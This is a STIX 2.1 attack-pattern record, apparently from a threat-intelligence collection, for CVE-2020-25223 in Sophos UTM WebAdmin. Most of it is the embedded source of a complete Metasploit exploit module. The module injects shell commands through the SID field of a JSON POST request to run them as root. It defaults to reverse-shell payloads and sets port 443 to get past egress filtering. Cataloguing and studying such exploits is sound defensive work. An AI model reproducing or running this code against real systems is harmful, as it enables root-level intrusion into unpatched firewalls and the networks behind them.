{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a9a4fa05-fa17-463f-b6d4-06d50c66e2d1",
    "created": "2024-08-14T17:04:08.949357Z",
    "modified": "2024-08-14T17:04:08.949361Z",
    "name": "Sophos UTM WebAdmin SID Command Injection",
    "description": " This module exploits an SID-based command injection in Sophos UTM's WebAdmin interface to execute shell commands as the root user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/sophos_utm_webadmin_sid_cmd_injection.rb",
            "external_id": "sophos_utm_webadmin_sid_cmd_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-25223"
        },
        {
            "source_name": "reference",
            "url": "https://www.sophos.com/en-us/security-advisories/sophos-sa-20200918-sg-webadmin-rce"
        },
        {
            "source_name": "reference",
            "url": "https://www.atredis.com/blog/2021/8/18/sophos-utm-cve-2020-25223"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/assessments/d6e0dff3-dd46-4f19-831d-c3f3f2fa972a"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/stopwatch'\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Sophos UTM WebAdmin SID Command Injection',\n        'Description' => %q{\n          This module exploits an SID-based command injection in Sophos UTM's\n          WebAdmin interface to execute shell commands as the root user.\n        },\n        'Author' => [\n          # Discovered by unknown researcher(s)\n          'Justin Kennedy', # Analysis and PoC\n          'wvu' # Supplementary analysis and exploit\n        ],\n        'References' => [\n          ['CVE', '2020-25223'],\n          ['URL', 'https://www.sophos.com/en-us/security-advisories/sophos-sa-20200918-sg-webadmin-rce'],\n          ['URL', 'https://www.atredis.com/blog/2021/8/18/sophos-utm-cve-2020-25223'],\n          ['URL', 'https://attackerkb.com/assessments/d6e0dff3-dd46-4f19-831d-c3f3f2fa972a']\n        ],\n        'DisclosureDate' => '2020-09-18',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_perl_ssl'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :dropper,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 4444,\n          'LPORT' => 443, # XXX: Bypass Sophos UTM's egress filtering\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [FIRST_ATTEMPT_FAIL],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    sleep_time = rand(5..10)\n\n    injected, elapsed_time = Rex::Stopwatch.elapsed_time do\n      inject_cmd(\"sleep #{sleep_time}\", timeout: sleep_time * 1.5)\n    end\n\n    return CheckCode::Unknown if injected.nil?\n\n    vprint_status(\"Elapsed time: #{elapsed_time} seconds\")\n\n    # injected == false\n    unless injected && elapsed_time > sleep_time\n      return CheckCode::Safe('Failed to test command injection.')\n    end\n\n    # injected == true\n    CheckCode::Appears('Successfully tested command injection.')\n  end\n\n  def exploit\n    unless datastore['LPORT'] == 443\n      print_warning('LPORT=443 is recommended to bypass egress filtering')\n    end\n\n    print_status(\"Executing #{payload_instance.refname} (#{target.name})\")\n\n    case target['Type']\n    when :cmd\n      execute_command(payload.encoded)\n    when :dropper\n      execute_cmdstager\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    # nil or true on success\n    if inject_cmd(cmd) == false\n      fail_with(Failure::PayloadFailed, \"Failed to execute command: #{cmd}\")\n    end\n  end\n\n  def inject_cmd(cmd, timeout: 3.5)\n    vprint_status(\"Injecting command: #{cmd}\")\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'var'),\n      'ctype' => 'application/json; charset=UTF-8', # NOTE: charset is required\n      'data' => {\n        'SID' => \"|#{cmd}|\" # https://perldoc.perl.org/functions/open#Opening-a-filehandle-into-a-command\n      }.to_json\n    }, timeout)\n\n    return unless res\n    return false unless res.code == 200 && res.body.include?(alert_msg)\n\n    true\n  end\n\n  def alert_msg\n    # {\"RID\":\"\",\"objs\":[{\"js\":\"json_abort(true);\"},{\"alert\":\"Backend connection failed, please click Shift-Reload to try again.\"}]}\n    'Backend connection failed, please click Shift-Reload to try again.'\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-09-18",
    "x_mitre_platforms": [
        "linux'"
    ]
}